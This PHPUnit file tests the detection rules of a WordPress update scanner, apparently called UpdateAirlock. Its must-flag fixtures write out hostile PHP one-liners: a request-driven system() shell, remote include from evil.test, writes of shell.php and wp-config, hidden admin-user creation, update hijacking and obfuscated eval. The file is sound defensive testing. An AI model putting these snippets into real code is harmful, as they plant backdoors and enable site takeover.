<?php
/**
 * Must-flag and must-not-flag fixtures for every PHP and script rule.
 *
 * @package UpdateAirlock
 */

use PHPUnit\Framework\TestCase;
use Updlock\Inspect\Differ;
use Updlock\Inspect\Php_Scan;
use Updlock\Inspect\Rules\Code;
use Updlock\Inspect\Rules\Js;
use Updlock\Inspect\Rules\Network;
use Updlock\Inspect\Rules\Persistence;

class RulesTest extends TestCase {

	private function ids( $code, $old_hosts = array() ) {
		$code  = "<?php\n" . $code;
		$lines = Differ::split( $code );
		$scan  = new Php_Scan( $code );
		$found = array_merge(
			Code::scan( $scan, null, $lines, 'f.php' ),
			Persistence::scan( $scan, null, $lines, 'f.php' ),
			Network::findings( Network::php_hosts( $scan, null ), $old_hosts, $lines, 'f.php' )
		);
		return array_values( array_unique( array_column( $found, 'rule' ) ) );
	}

	public function flags() {
		return array(
			'eval'              => array( 'exec.eval', 'eval( $code );', 'echo 1;' ),
			'assert dynamic'    => array( 'exec.assert_dynamic', 'assert( $x );', 'assert( true );' ),
			'create_function'   => array( 'exec.create_function', '$f = create_function( "", "x" );', '$f = function () {};' ),
			'preg /e'           => array( 'exec.preg_e', 'preg_replace( "/a/e", $b, $c );', 'preg_replace( "/a/i", $b, $c );' ),
			'request callable'  => array( 'exec.request_call', 'call_user_func( $_GET["f"] );', 'call_user_func( "strtoupper", "x" );' ),
			'request callee'    => array( 'exec.request_call', '$_POST["f"]( 1 );', '$a = $_POST["f"];' ),
			'shell'             => array( 'exec.shell', 'shell_exec( "ls" );', '$wpdb->exec( "ls" );' ),
			'shell from request' => array( 'exec.shell_request', 'system( $_GET["c"] );', 'system( "ls" );' ),
			'include remote'    => array( 'exec.include_remote', 'include "https://evil.test/a.php";', 'include __DIR__ . "/a.php";' ),
			'unserialize remote' => array( 'deser.remote', '$b = wp_remote_retrieve_body( wp_remote_get( $u ) ); $d = unserialize( $b );', '$d = unserialize( "a:0:{}" );' ),
			'unserialize request' => array( 'deser.remote', 'maybe_unserialize( $_COOKIE["x"] );', '$s = serialize( array() );' ),
			'unserialize dynamic' => array( 'deser.dynamic', '$d = unserialize( $stored );', '$d = unserialize( "b:0;" );' ),
			'decode chain'      => array( 'obf.decode_chain', '$x = gzinflate( base64_decode( $y ) );', '$x = strrev( $y );' ),
			'single decode'     => array( 'obf.decode', '$x = base64_decode( $y );', '$x = base64_encode( $y );' ),
			'chr concat'        => array( 'obf.chr_concat', '$s = chr(101).chr(118).chr(97).chr(108).chr(40).chr(41);', '$s = chr( 65 );' ),
			'long string'       => array( 'obf.long_string', '$p = "' . self::packed_blob() . '";', '$p = "' . str_repeat( 'hello world ', 60 ) . '";' ),
			'wp-config write'   => array( 'persist.wp_config', 'file_put_contents( ABSPATH . "wp-config.php", $c );', 'file_put_contents( ABSPATH . "notes.txt", $c );' ),
			'htaccess write'    => array( 'persist.htaccess', 'file_put_contents( ABSPATH . ".htaccess", $c );', 'file_put_contents( ABSPATH . "a.txt", $c );' ),
			'mu-plugins write'  => array( 'persist.mu_plugin', 'file_put_contents( WPMU_PLUGIN_DIR . "/a.txt", $c );', 'file_put_contents( $dir . "/a.txt", $c );' ),
			'other plugin write' => array( 'persist.other_plugin', 'file_put_contents( WP_PLUGIN_DIR . "/x/a.txt", $c );', 'file_put_contents( $dir . "/a.txt", $c );' ),
			'write php'         => array( 'persist.write_php', 'file_put_contents( $dir . "/shell.php", $c );', 'file_put_contents( $dir . "/data.json", $c );' ),
			'cron'              => array( 'persist.cron', 'wp_schedule_event( time(), "daily", "x_hook" );', 'wp_clear_scheduled_hook( "x_hook" );' ),
			'admin user'        => array( 'priv.admin_user', 'wp_insert_user( array( "user_login" => "a", "role" => "administrator" ) );', 'wp_insert_user( array( "user_login" => "a", "role" => "subscriber" ) );' ),
			'promote user'      => array( 'priv.admin_user', '$u->set_role( "administrator" );', '$u->set_role( "editor" );' ),
			'create user'       => array( 'priv.user_create', 'wp_create_user( "a", "b", "c@d.test" );', 'get_user_by( "id", 1 );' ),
			'hide users'        => array( 'priv.hide_users', 'add_action( "pre_user_query", "x" );', 'add_action( "pre_get_posts", "x" );' ),
			'hide plugins'      => array( 'priv.hide_self', 'add_filter( "all_plugins", "x" );', 'add_filter( "the_content", "x" );' ),
			'open rest route'   => array( 'priv.rest_open', 'register_rest_route( "a/v1", "/b", array( "permission_callback" => "__return_true" ) );', 'register_rest_route( "a/v1", "/b", array( "permission_callback" => "x_can" ) );' ),
			'update filter'     => array( 'hijack.update_filter', 'add_filter( "site_transient_update_plugins", "x" );', 'add_filter( "the_title", "x" );' ),
			'update hide'       => array( 'hijack.update_hide', 'unset( $t->response["a/a.php"] );', 'unset( $t->checked );' ),
			'update source'     => array( 'hijack.update_source', 'add_filter( "upgrader_pre_download", "x" );', 'add_filter( "upgrader_source_selection", "x" );' ),
			'new host'          => array( 'net.new_host', 'wp_remote_get( "https://tracker.test/ping" );', 'wp_remote_get( home_url() );' ),
			'ip host'           => array( 'net.ip_host', 'wp_remote_get( "http://203.0.113.9/a" );', 'wp_remote_get( "http://192.168.1.2/a" );' ),
			'host through var'  => array( 'net.new_host', '$u = "https://cdn.test/x"; wp_remote_get( $u );', '$u = home_url(); wp_remote_get( $u );' ),
			'url literal'       => array( 'net.url_literal', '$t = "see https://docs.test/page";', '$t = "see the page";' ),
			'known host'        => array( 'net.new_host_low', 'wp_remote_get( "https://api.wordpress.org/x" );', 'wp_remote_get( "https://api.wordpress.org/x" );' ),
		);
	}

	private static function packed_blob() {
		$out = '';
		for ( $i = 0; $i < 500; $i++ ) {
			$out .= chr( 65 + ( ( $i * 7 + ( $i % 5 ) * 13 + ( $i % 11 ) ) % 26 ) ) . dechex( ( $i * 31 ) % 16 );
		}
		return $out;
	}

	/**
	 * @dataProvider flags
	 */
	public function test_rule_flags_and_stays_quiet( $rule, $bad, $good ) {
		$this->assertContains( $rule, $this->ids( $bad ), 'must flag ' . $rule );
		if ( 'net.new_host_low' === $rule ) {
			$this->assertNotContains( 'net.new_host', $this->ids( $good ) );
			return;
		}
		$this->assertNotContains( $rule, $this->ids( $good ), 'must not flag ' . $rule );
	}

	public function test_known_hosts_in_installed_version_are_not_new() {
		$this->assertSame( array(), $this->ids( 'wp_remote_get( "https://tracker.test/ping" );', array( 'tracker.test' => true ) ) );
	}

	public function test_only_added_lines_are_flagged() {
		$code  = "<?php\neval( \$a );\n\$ok = 1;\n";
		$lines = Differ::split( $code );
		$scan  = new Php_Scan( $code );
		$this->assertSame( array(), Code::scan( $scan, array( 3 => true ), $lines, 'f.php' ) );
		$this->assertCount( 1, Code::scan( $scan, array( 2 => true ), $lines, 'f.php' ) );
	}

	public function test_comments_and_strings_do_not_look_like_calls() {
		$this->assertSame( array(), $this->ids( "// eval( \$x ); unserialize( \$y );\n\$s = 'eval( \$x )';\n/* shell_exec( 'x' ); */" ) );
	}

	public function test_methods_named_like_functions_are_ignored() {
		$this->assertSame( array(), $this->ids( '$o->eval( $a ); $o->system( $b ); Foo::exec( $c );' ) );
	}

	public function js_cases() {
		return array(
			'eval'         => array( 'js.eval', 'var a = eval( code );', 'var a = evaluate( code );' ),
			'new Function' => array( 'js.eval', 'var f = new Function( "return 1" );', 'var f = function () {};' ),
		);
	}

	/**
	 * @dataProvider js_cases
	 */
	public function test_js_rules( $rule, $bad, $good ) {
		$this->assertSame( $rule, Js::scan( array( $bad ), null, 'a.js' )[0]['rule'] );
		$this->assertSame( array(), Js::scan( array( $good ), null, 'a.js' ) );
	}

	public function test_browser_hosts() {
		$bad  = Network::findings( Network::text_hosts( array( 'fetch("https://t.test/x");' ), null, true ), array(), array(), 'a.js' );
		$tag  = Network::findings( Network::text_hosts( array( '<script src="https://cdn.test/x.js"></script>' ), null, false ), array(), array(), 'a.html' );
		$none = Network::text_hosts( array( '// see https://docs.test/x' ), null, true );
		$this->assertSame( 'js.new_host', $bad[0]['rule'] );
		$this->assertSame( 'js.new_host', $tag[0]['rule'] );
		$this->assertSame( array(), $none );
	}
}
